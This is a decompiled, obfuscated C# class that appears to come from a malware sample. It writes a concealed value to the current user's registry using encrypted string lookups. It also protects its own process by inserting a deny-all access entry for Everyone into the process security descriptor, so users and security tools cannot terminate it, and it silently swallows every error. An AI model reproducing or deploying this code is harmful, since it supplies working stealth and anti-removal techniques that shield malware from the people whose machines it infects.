using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class VnuNKsUxQyF
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr GGrxQlTfNcRGH, int ZFhjPvGdJG, [Out] byte[] WKBJFVWlfDxGgG, uint BqNbLmnZPTLL, out uint wtuPRrZpKDGOwz);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr uMggVwcBIEOvqy, int AmsaJpsjgFf, [In] byte[] cQlytDSAidPZU);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void CVGxLNTbmXtfBQ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107380642)));
			registryKey.SetValue(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107380505)), getString_0(107349938));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor GuSdMPgxNzFJEc(IntPtr intptr_0)
	{
		byte[] wKBJFVWlfDxGgG = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, wKBJFVWlfDxGgG, 0u, out var wtuPRrZpKDGOwz);
		if ((long)wtuPRrZpKDGOwz > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, wKBJFVWlfDxGgG = new byte[wtuPRrZpKDGOwz], wtuPRrZpKDGOwz, out wtuPRrZpKDGOwz))
		{
			return null;
		}
		return new RawSecurityDescriptor(wKBJFVWlfDxGgG, 0);
	}

	private void TtqLuzcUWyOQ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void aYvfzoKhSvboqDi()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = GuSdMPgxNzFJEc(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			TtqLuzcUWyOQ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static VnuNKsUxQyF()
	{
		Strings.CreateGetStringDelegate(typeof(VnuNKsUxQyF));
	}
}
